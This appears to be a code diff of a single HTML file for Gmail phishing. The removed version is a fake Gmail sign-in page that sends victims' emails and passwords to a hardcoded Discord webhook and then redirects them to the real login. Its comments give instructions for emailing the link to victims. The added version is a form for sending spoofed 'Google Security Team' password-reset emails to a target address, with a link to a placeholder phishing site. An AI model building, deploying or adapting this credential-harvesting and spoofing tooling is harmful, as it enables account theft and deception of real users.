@@ -1,108 +1,63 @@
-<!-- 
-  SINGLE HTML FILE – COMPLETE PHISHING PAGE
-  Host this on any static server (GitHub Pages, Netlify, or your own VPS).
-  Send the link (e.g., https://yourdomain.com/index.html) via email to victims.
-  Credentials are sent directly to the Discord webhook provided.
--->
-
+<!-- index.html – UI to send fake Gmail password reset email -->
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Gmail - Sign in</title>
+    <title>Gmail Password Reset Sender</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Google Sans', Roboto, Arial, sans-serif; }
-        body { background: #fff; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
-        .container { background: #fff; padding: 48px 40px 36px; border: 1px solid #dadce0; border-radius: 8px; max-width: 450px; width: 100%; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
-        .logo { text-align: center; margin-bottom: 20px; }
-        .logo svg { width: 75px; height: 24px; }
-        .title { font-size: 24px; font-weight: 400; text-align: center; color: #202124; margin-bottom: 8px; }
-        .subtitle { text-align: center; font-size: 16px; color: #5f6368; margin-bottom: 32px; }
-        .input-group { margin-bottom: 20px; position: relative; }
-        .input-group input { width: 100%; padding: 13px 15px; font-size: 16px; border: 1px solid #dadce0; border-radius: 4px; outline: none; transition: border 0.2s; }
-        .input-group input:focus { border-color: #1a73e8; border-width: 2px; }
-        .input-group label { position: absolute; left: 15px; top: 13px; color: #5f6368; font-size: 16px; pointer-events: none; transition: 0.2s; background: #fff; padding: 0 4px; }
-        .input-group input:focus + label, .input-group input:not(:placeholder-shown) + label { top: -8px; font-size: 12px; color: #1a73e8; }
-        .password-options { display: flex; justify-content: space-between; align-items: center; margin: 10px 0 20px; font-size: 14px; }
-        .password-options a { color: #1a73e8; text-decoration: none; }
-        .password-options a:hover { text-decoration: underline; }
-        .btn { background: #1a73e8; color: #fff; border: none; padding: 12px; border-radius: 4px; font-size: 16px; font-weight: 500; width: 100%; cursor: pointer; transition: background 0.2s; }
+        body { background: #f1f3f4; font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
+        .container { background: #fff; padding: 40px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); max-width: 500px; width: 100%; }
+        h2 { color: #202124; font-weight: 400; }
+        label { display: block; margin: 15px 0 5px; font-weight: 500; color: #3c4043; }
+        input, textarea, select { width: 100%; padding: 10px; border: 1px solid #dadce0; border-radius: 4px; box-sizing: border-box; font-size: 14px; }
+        textarea { height: 120px; resize: vertical; }
+        .btn { background: #1a73e8; color: #fff; border: none; padding: 12px; border-radius: 4px; width: 100%; font-size: 16px; cursor: pointer; margin-top: 20px; }
         .btn:hover { background: #1765cc; }
-        .footer { text-align: center; margin-top: 24px; font-size: 14px; color: #5f6368; }
-        .footer a { color: #1a73e8; text-decoration: none; }
-        .footer a:hover { text-decoration: underline; }
-        .error { color: #d93025; font-size: 13px; margin: 8px 0; display: none; text-align: center; }
+        .status { margin-top: 15px; padding: 10px; border-radius: 4px; display: none; }
+        .status.success { background: #e6f4ea; color: #1e7e34; display: block; }
+        .status.error { background: #fce8e6; color: #d93025; display: block; }
     </style>
 </head>
 <body>
 <div class="container">
-    <div class="logo">
-        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 75 24" width="75" height="24">
-            <path fill="#4285F4" d="M11.8 12.5L4.8 6.2v12.6l7-6.3z"/>
-            <path fill="#34A853" d="M4.8 6.2L-0.8 9.8v1.6l5.6 3.6 0.0-8.8z"/>
-            <path fill="#FBBC05" d="M4.8 18.8v-1.6L0 19.2v2.4c0 1.3 1.1 2.4 2.4 2.4h70.2c1.3 0 2.4-1.1 2.4-2.4v-2.4l-4.8-3.2v1.6L4.8 18.8z"/>
-            <path fill="#EA4335" d="M70.2 0H2.4C1.1 0 0 1.1 0 2.4v2.4l4.8 3.2V4.8L11.8 0h58.4z"/>
-            <path fill="#C5221F" d="M75 2.4c0-1.3-1.1-2.4-2.4-2.4h-2.4L75 7.2V2.4z"/>
-            <text x="8" y="22" font-family="Arial" font-size="10" fill="#5f6368">Gmail</text>
-        </svg>
-    </div>
-    <div class="title">Sign in</div>
-    <div class="subtitle">to continue to Gmail</div>
-    <form id="loginForm">
-        <div class="input-group">
-            <input type="email" id="email" name="email" placeholder=" " required>
-            <label for="email">Email or phone</label>
-        </div>
-        <div class="input-group">
-            <input type="password" id="password" name="password" placeholder=" " required>
-            <label for="password">Password</label>
-        </div>
-        <div class="password-options">
-            <a href="#" onclick="return false;">Forgot password?</a>
-            <a href="#" onclick="return false;">Create account</a>
-        </div>
-        <div class="error" id="errorMsg">Incorrect email or password. Try again.</div>
-        <button type="submit" class="btn">Next</button>
+    <h2>Send Fake Password Reset</h2>
+    <form id="emailForm" action="send_mail.php" method="POST">
+        <label for="targetEmail">Target Email</label>
+        <input type="email" id="targetEmail" name="targetEmail" placeholder="victim@gmail.com" required>
+
+        <label for="senderName">Sender Name (spoofed)</label>
+        <input type="text" id="senderName" name="senderName" value="Google Security Team">
+
+        <label for="senderEmail">Sender Email (spoofed)</label>
+        <input type="email" id="senderEmail" name="senderEmail" value="security@google.com">
+
+        <label for="subject">Subject</label>
+        <input type="text" id="subject" name="subject" value="Action required: Password reset request">
+
+        <label for="message">Email Body (HTML allowed)</label>
+        <textarea id="message" name="message" rows="6">
+Dear user,
+
+We received a request to reset your Gmail password. If you did not initiate this, please ignore this email.
+Otherwise, click the link below to confirm reset:
+
+<a href="https://your-phishing-site.com/reset.php?email={{email}}">Reset Your Password</a>
+
+If you have any questions, contact Google Support.
+        </textarea>
+
+        <button type="submit" class="btn">Send Email</button>
     </form>
-    <div class="footer">
-        English (United States) · <a href="#">Help</a> · <a href="#">Privacy</a> · <a href="#">Terms</a>
-    </div>
+    <div id="status" class="status"></div>
 </div>
 <script>
-    // ===== Discord Webhook (hardcoded) =====
-    const WEBHOOK_URL = "https://discord.com/api/webhooks/1520406085511675974/904vxaGgyqXpdx3D9Uj7pVn_zJAcRfU7Rte7RZ3UTGPby3ff-QBIXzqqFuE_lB8bYrmX";
-
-    document.getElementById('loginForm').addEventListener('submit', function(e) {
-        e.preventDefault();
-        const email = document.getElementById('email').value.trim();
-        const password = document.getElementById('password').value.trim();
-        if (!email || !password) {
-            document.getElementById('errorMsg').style.display = 'block';
-            return;
-        }
-        // Build webhook payload
-        const payload = {
-            content: `**Gmail Credentials**\nEmail: ${email}\nPassword: ${password}`,
-            username: "GmailHarvester",
-            avatar_url: "https://ssl.gstatic.com/ui/v1/icons/mail/rfr/gmail.ico"
-        };
-        // Send to Discord via fetch
-        fetch(WEBHOOK_URL, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(payload)
-        }).then(() => {
-            // Redirect to real Gmail login
-            window.location.href = 'https://accounts.google.com/ServiceLogin?service=mail&continue=https://mail.google.com';
-        }).catch(() => {
-            // Redirect even if webhook fails
-            window.location.href = 'https://accounts.google.com/ServiceLogin?service=mail&continue=https://mail.google.com';
-        });
-        // Show error and clear fields
-        document.getElementById('errorMsg').style.display = 'block';
-        document.getElementById('email').value = '';
-        document.getElementById('password').value = '';
+    document.getElementById('emailForm').addEventListener('submit', function(e) {
+        const status = document.getElementById('status');
+        status.className = 'status';
+        status.style.display = 'none';
+        // Show loading
+        this.querySelector('.btn').textContent = 'Sending...';
     });
 </script>
 </body>
